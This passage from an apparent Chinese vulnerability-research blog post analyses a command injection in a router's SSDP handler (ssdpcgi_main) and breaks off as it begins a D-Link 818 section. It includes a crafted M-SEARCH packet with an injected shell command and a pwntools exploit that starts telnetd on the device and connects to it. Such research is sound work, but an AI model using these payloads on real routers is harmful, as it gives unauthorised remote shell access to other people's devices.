+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201519160.png" srcset="/img/loading.gif" lazyload alt="image-20240825201519160"></p>
+<p>进入ssdpcgi_main</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201602517.png" srcset="/img/loading.gif" lazyload alt="image-20240825201602517"></p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201705430.png" srcset="/img/loading.gif" lazyload alt="image-20240825201705430"></p>
+<p>此时栈上的值</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201744480.png" srcset="/img/loading.gif" lazyload alt="image-20240825201744480"></p>
+<p>参数存入寄存器</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825202019245.png" srcset="/img/loading.gif" lazyload alt="image-20240825202019245"></p>
+<p>strncmp比较前0x5的字符是否相等</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825202354671.png" srcset="/img/loading.gif" lazyload alt="image-20240825202354671"></p>
+<p>带参数进入命令执行函数</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825202641697.png" srcset="/img/loading.gif" lazyload alt="image-20240825202641697"></p>
+<p>执行成功</p>
+<p>代码分析</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> __fastcall ssdpcgi_main(<span class="hljs-keyword">int</span> a1)<br>&#123;<br>  <span class="hljs-keyword">int</span> result; <span class="hljs-regexp">//</span> <span class="hljs-variable">$v0</span><br>  char *<span class="hljs-number">v2</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$s0</span><br>  char *<span class="hljs-number">v3</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$s3</span><br>  char *<span class="hljs-number">v4</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$v0</span><br>  char *<span class="hljs-number">v5</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$s2</span><br>  const char *<span class="hljs-number">v6</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$s1</span><br>  bool <span class="hljs-number">v7</span>; <span class="hljs-regexp">//</span> dc<br>  char *<span class="hljs-number">v8</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$a2</span><br>  const char *<span class="hljs-number">v9</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$a0</span><br>  char *<span class="hljs-number">v10</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$a3</span><br><br>  // 初始化结果为-<span class="hljs-number">1</span><br>  result = -<span class="hljs-number">1</span>;<br><br>  <span class="hljs-regexp">//</span> 检查参数a1是否为<span class="hljs-number">2</span>，如果不是则直接返回-<span class="hljs-number">1</span><br>  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-regexp">//</span> 获取环境变量<span class="hljs-string">&quot;HTTP_ST&quot;</span>的值，并将其赋值给<span class="hljs-number">v2</span><br>    <span class="hljs-number">v2</span> = getenv(<span class="hljs-string">&quot;HTTP_ST&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>的值，并将其赋值给<span class="hljs-number">v3</span><br>    <span class="hljs-number">v3</span> = getenv(<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量<span class="hljs-string">&quot;REMOTE_PORT&quot;</span>的值，并将其赋值给<span class="hljs-number">v5</span><br>    <span class="hljs-number">v5</span> = getenv(<span class="hljs-string">&quot;REMOTE_PORT&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量<span class="hljs-string">&quot;SERVER_ID&quot;</span>的值，并将其赋值给<span class="hljs-number">v4</span><br>    <span class="hljs-number">v4</span> = getenv(<span class="hljs-string">&quot;SERVER_ID&quot;</span>);<br>    <span class="hljs-regexp">//</span> 将<span class="hljs-number">v4</span>赋值给<span class="hljs-number">v6</span><br>    <span class="hljs-number">v6</span> = <span class="hljs-number">v4</span>;<br><br>    <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v2</span>、<span class="hljs-number">v3</span>和<span class="hljs-number">v5</span>是否都存在，如果都存在则继续执行<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-number">v2</span> &amp;&amp; <span class="hljs-number">v3</span> &amp;&amp; <span class="hljs-number">v5</span> )<br>    &#123;<br>      <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v4</span>是否为NULL，如果为NULL则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>      <span class="hljs-number">v7</span> = <span class="hljs-number">v4</span> == <span class="hljs-number">0</span>;<br>      <span class="hljs-regexp">//</span> 初始化结果为-<span class="hljs-number">1</span><br>      result = -<span class="hljs-number">1</span>;<br>      <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为false，则说明<span class="hljs-number">v4</span>不为NULL，继续执行<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v7</span> )<br>      &#123;<br>        <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v2</span>字符串中是否包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，如果包含则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>        <span class="hljs-number">v7</span> = strchr(<span class="hljs-number">v2</span>, <span class="hljs-number">96</span>) != <span class="hljs-number">0</span>;<br>        <span class="hljs-regexp">//</span> 初始化结果为-<span class="hljs-number">1</span><br>        result = -<span class="hljs-number">1</span>;<br>        <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为false，则说明<span class="hljs-number">v2</span>字符串中不包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，继续执行<br>        <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v7</span> )<br>        &#123;<br>          <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v3</span>字符串中是否包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，如果包含则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>          <span class="hljs-number">v7</span> = strchr(<span class="hljs-number">v3</span>, <span class="hljs-number">96</span>) != <span class="hljs-number">0</span>;<br>          <span class="hljs-regexp">//</span> 初始化结果为-<span class="hljs-number">1</span><br>          result = -<span class="hljs-number">1</span>;<br>          <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为false，则说明<span class="hljs-number">v3</span>字符串中不包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，继续执行<br>          <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v7</span> )<br>          &#123;<br>            <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v5</span>字符串中是否包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，如果包含则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>            <span class="hljs-number">v7</span> = strchr(<span class="hljs-number">v5</span>, <span class="hljs-number">96</span>) != <span class="hljs-number">0</span>;<br>            <span class="hljs-regexp">//</span> 初始化结果为-<span class="hljs-number">1</span><br>            result = -<span class="hljs-number">1</span>;<br>            <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为false，则说明<span class="hljs-number">v5</span>字符串中不包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，继续执行<br>            <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v7</span> )<br>            &#123;<br>              <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v6</span>字符串中是否包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，如果包含则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>              <span class="hljs-number">v7</span> = strchr(<span class="hljs-number">v6</span>, <span class="hljs-number">96</span>) != <span class="hljs-number">0</span>;<br>              <span class="hljs-regexp">//</span> 初始化结果为-<span class="hljs-number">1</span><br>              result = -<span class="hljs-number">1</span>;<br>              <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为false，则说明<span class="hljs-number">v6</span>字符串中不包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，继续执行<br>              <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v7</span> )<br>              &#123;<br>                <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v2</span>字符串的前<span class="hljs-number">8</span>个字符是否与<span class="hljs-string">&quot;ssdp:all&quot;</span>相同，如果相同则执行以下操作<br>                <span class="hljs-keyword">if</span> ( !strncmp(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;ssdp:all&quot;</span>, 8u) )<br>                &#123;<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v3</span>赋值给<span class="hljs-number">v8</span><br>                  <span class="hljs-number">v8</span> = <span class="hljs-number">v3</span>;<br>                  <span class="hljs-regexp">//</span> 将字符串<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> ssdpall <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>赋值给<span class="hljs-number">v9</span><br>                  <span class="hljs-number">v9</span> = <span class="hljs-string">&quot;<span class="hljs-variable">%s</span> ssdpall <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>;<br><br>LABEL_14:<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v5</span>赋值给<span class="hljs-number">v10</span><br>                  <span class="hljs-number">v10</span> = <span class="hljs-number">v5</span>;<br><br>LABEL_23:<br>                  <span class="hljs-regexp">//</span> 调用lxmldbc_system函数，参数为<span class="hljs-number">v9</span>、<span class="hljs-string">&quot;/etc/scripts/upnp/M-SEARCH.sh&quot;</span>、<span class="hljs-number">v8</span>和<span class="hljs-number">v10</span><br>                  lxmldbc_system(<span class="hljs-number">v9</span>, <span class="hljs-string">&quot;/etc/scripts/upnp/M-SEARCH.sh&quot;</span>, <span class="hljs-number">v8</span>, <span class="hljs-number">v10</span>);<br>                  <span class="hljs-regexp">//</span> 返回<span class="hljs-number">0</span><br>                  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                &#125;<br><br>                // 检查<span class="hljs-number">v2</span>字符串的前<span class="hljs-number">15</span>个字符是否与<span class="hljs-string">&quot;upnp:rootdevice&quot;</span>相同，如果相同则执行以下操作<br>                <span class="hljs-keyword">if</span> ( !strncmp(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;upnp:rootdevice&quot;</span>, 0xFu) )<br>                &#123;<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v3</span>赋值给<span class="hljs-number">v8</span><br>                  <span class="hljs-number">v8</span> = <span class="hljs-number">v3</span>;<br>                  <span class="hljs-regexp">//</span> 将字符串<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> rootdevice <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>赋值给<span class="hljs-number">v9</span><br>                  <span class="hljs-number">v9</span> = <span class="hljs-string">&quot;<span class="hljs-variable">%s</span> rootdevice <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>;<br>                  <span class="hljs-regexp">//</span> 跳转到LABEL_14<br>                  <span class="hljs-keyword">goto</span> LABEL_14;<br>                &#125;<br><br>                // 检查<span class="hljs-number">v2</span>字符串的前<span class="hljs-number">5</span>个字符是否与<span class="hljs-string">&quot;uuid:&quot;</span>相同，如果相同则执行以下操作<br>                <span class="hljs-keyword">if</span> ( !strncmp(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;uuid:&quot;</span>, 5u) )<br>                &#123;<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v3</span>赋值给<span class="hljs-number">v8</span><br>                  <span class="hljs-number">v8</span> = <span class="hljs-number">v3</span>;<br>                  <span class="hljs-regexp">//</span> 将字符串<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> uuid <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>赋值给<span class="hljs-number">v9</span><br>                  <span class="hljs-number">v9</span> = <span class="hljs-string">&quot;<span class="hljs-variable">%s</span> uuid <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>;<br><br>LABEL_22:<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v5</span>赋值给<span class="hljs-number">v10</span><br>                  <span class="hljs-number">v10</span> = <span class="hljs-number">v5</span>;<br>                  <span class="hljs-regexp">//</span> 跳转到LABEL_23<br>                  <span class="hljs-keyword">goto</span> LABEL_23;<br>                &#125;<br><br>                // 检查<span class="hljs-number">v2</span>字符串的前<span class="hljs-number">4</span>个字符是否与<span class="hljs-string">&quot;urn:&quot;</span>相同，如果不相同则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>                <span class="hljs-number">v7</span> = strncmp(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;urn:&quot;</span>, 4u) != <span class="hljs-number">0</span>;<br>                <span class="hljs-regexp">//</span> 初始化结果为<span class="hljs-number">0</span><br>                result = <span class="hljs-number">0</span>;<br><br>                <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为true，则说明<span class="hljs-number">v2</span>字符串的前<span class="hljs-number">4</span>个字符不与<span class="hljs-string">&quot;urn:&quot;</span>相同，直接返回结果<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-number">v7</span> )<br>                  <span class="hljs-keyword">return</span> result;<br><br>                <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v2</span>字符串中是否包含<span class="hljs-string">&quot;:device:&quot;</span>，如果包含则执行以下操作<br>                <span class="hljs-keyword">if</span> ( strstr(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;:device:&quot;</span>) )<br>                &#123;<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v3</span>赋值给<span class="hljs-number">v8</span><br>                  <span class="hljs-number">v8</span> = <span class="hljs-number">v3</span>;<br>                  <span class="hljs-regexp">//</span> 将字符串<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> devices <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>赋值给<span class="hljs-number">v9</span><br>                  <span class="hljs-number">v9</span> = <span class="hljs-string">&quot;<span class="hljs-variable">%s</span> devices <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>;<br>                  <span class="hljs-regexp">//</span> 跳转到LABEL_22<br>                  <span class="hljs-keyword">goto</span> LABEL_22;<br>                &#125;<br><br>                // 检查<span class="hljs-number">v2</span>字符串中是否包含<span class="hljs-string">&quot;:service:&quot;</span>，如果包含则执行以下操作<br>                <span class="hljs-keyword">if</span> ( strstr(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;:service:&quot;</span>) )<br>                &#123;<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v3</span>赋值给<span class="hljs-number">v8</span><br>                  <span class="hljs-number">v8</span> = <span class="hljs-number">v3</span>;<br>                  <span class="hljs-regexp">//</span> 将字符串<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> services <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>赋值给<span class="hljs-number">v9</span><br>                  <span class="hljs-number">v9</span> = <span class="hljs-string">&quot;<span class="hljs-variable">%s</span> services <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>;<br>                  <span class="hljs-regexp">//</span> 跳转到LABEL_22<br>                  <span class="hljs-keyword">goto</span> LABEL_22;<br>                &#125;<br><br>                // 返回<span class="hljs-number">0</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>    // 否则，返回-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br>  // 返回结果<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个函数 <code>ssdpcgi_main</code> 的作用是解析来自 UPnP 设备的 M-SEARCH 请求，根据请求内容调用相应的脚本进行处理，最终生成 UPnP 响应消息</p>
+<h6 id="函数逻辑"><a href="#函数逻辑" class="headerlink" title="函数逻辑"></a>函数逻辑</h6><ol>
+<li><strong>获取环境变量：</strong> 函数首先获取几个重要的环境变量：<ul>
+<li><code>HTTP_ST</code>: 搜索目标 (Search Target)，用于标识搜索的设备类型或服务类型。</li>
+<li><code>REMOTE_ADDR</code>: 请求的源 IP 地址。</li>
+<li><code>REMOTE_PORT</code>: 请求的源端口号。</li>
+<li><code>SERVER_ID</code>: 服务器的标识符。</li>
+</ul>
+</li>
+<li><strong>检查请求格式：</strong> 函数检查这些环境变量的值是否符合 UPnP 协议的规范，例如：<ul>
+<li>检查 <code>HTTP_ST</code>、<code>REMOTE_ADDR</code> 和 <code>REMOTE_PORT</code> 是否存在。</li>
+<li>检查这些环境变量的值是否包含非法字符 <code> </code> (空格)。</li>
+</ul>
+</li>
+<li><strong>解析搜索目标：</strong> 函数根据 <code>HTTP_ST</code> 的值解析搜索目标类型，并调用相应的脚本进行处理：<ul>
+<li><strong>“ssdp:all”</strong>: 搜索所有设备，调用 <code>/etc/scripts/upnp/M-SEARCH.sh</code> 脚本。</li>
+<li><strong>“upnp:rootdevice”</strong>: 搜索根设备</li>
+<li><strong>“uuid:”</strong>: 搜索特定设备</li>
+<li><strong>“urn:”</strong>: 搜索特定设备或服务</li>
+</ul>
+</li>
+<li><strong>调用脚本：</strong> 函数使用 <code>lxmldbc_system</code> 函数调用相应的脚本，并将环境变量值作为参数传递给脚本。</li>
+</ol>
+<p>这里的漏洞点在于它直接将用户输入的 <code>HTTP_ST</code> 环境变量值拼接进 shell 命令中，然后使用 <code>lxmldbc_system</code> 函数执行该命令。</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823134331890.png" srcset="/img/loading.gif" lazyload alt="image-20240823134331890"></p>
+<p>这里可以看出v2（也就是那个ssdp包），不能包含上面三个标红框的参数，否则会被覆盖，并且必须包含<code>urn:</code>，否则函数会return0，继续往下走，好像无论包含不包含<code>：device：</code>,v2都会被覆盖，查看汇编：</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823134635202.png" srcset="/img/loading.gif" lazyload alt="image-20240823134635202"></p>
+<p>假设包含device，这里的beq不进行跳转，继续往下走，跳到40e338</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823134728002.png" srcset="/img/loading.gif" lazyload alt="image-20240823134728002"></p>
+<p>这里直接走到lxmldbc_system函数了</p>
+<p>所以ssdp包中应该包含<code>:device:</code></p>
+<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>修改上面ssdp包示例的那个包进行发包测试</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">M</span>-SEARCH * HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">HOST</span>:<span class="hljs-number">192.168.0.1</span><br><span class="hljs-attribute">ST</span>:urn:device:<span class="hljs-number">1</span>;touch /tmp/<span class="hljs-number">1</span><br><span class="hljs-attribute">MX</span>:<span class="hljs-number">3</span><br><span class="hljs-attribute">MAN</span>:<span class="hljs-string">&quot;ssdp:discover&quot;</span><br><br><br></code></pre></td></tr></table></figure>
+
+<p><strong>这里的空格和换行非常严格</strong> ，踩坑了</p>
+<p>exp</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&quot;192.168.0.1&quot;</span>,<span class="hljs-number">1900</span>,typ=<span class="hljs-string">&#x27;udp&#x27;</span>)<br>payload  = b<span class="hljs-string">&#x27;M-SEARCH * HTTP/1.1\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;HOST:192.168.0.1:1900\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;ST:urn:device:1;telnetd\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;MX:2\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;MAN:&quot;ssdp:discover&quot;\n\n&#x27;</span><br><span class="hljs-built_in">io</span>.send(payload)<br>sleep(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;telnet &#x27;</span> + <span class="hljs-string">&#x27;192.168.0.1&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823130837246.png" srcset="/img/loading.gif" lazyload alt="image-20240823130837246"></p>
+<h4 id="DLink-818-RCE-soapcgi-main-upnp"><a href="#DLink-818-RCE-soapcgi-main-upnp" class="headerlink" title="DLink-818 RCE soapcgi_main upnp"></a>DLink-818 RCE soapcgi_main upnp</h4><p>漏洞点存在于soapcgi_main函数中</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span 